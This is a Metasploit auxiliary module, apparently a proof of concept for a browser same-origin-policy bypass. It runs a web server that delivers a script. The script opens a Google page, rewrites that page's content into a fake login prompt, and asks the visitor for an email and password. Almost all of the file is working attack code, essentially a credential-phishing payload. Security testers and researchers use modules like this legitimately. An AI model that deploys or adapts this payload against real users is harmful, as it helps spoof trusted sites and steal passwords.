##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Browser SOP Bypass",
        'Description'    => %q(
          This module do a server-redirect combined with a data-URI end up bypassing the Same Origin Policy,which leads to all kind of vulnerabilities like stealing user passwords.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra',
        ],
        'References'     => [
        ['URL', 'http://fr.0day.today/exploit/description/28434'],
        ],
        'DisclosureDate' => "Nov 09 2017",
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
<html><body><script>
function go(){
var x = window.open('https://www.google.com/csi');
setTimeout(function(){x.document.body.innerHTML='<h1>Please login</h1>';a=x.prompt('E-mail','');b=x.prompt('Password','');alert('E-mail: '+a+'\nPassword: '+b)},3000);
}
</script>
<button onclick="go()">go</button>
</body></html>
    |
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
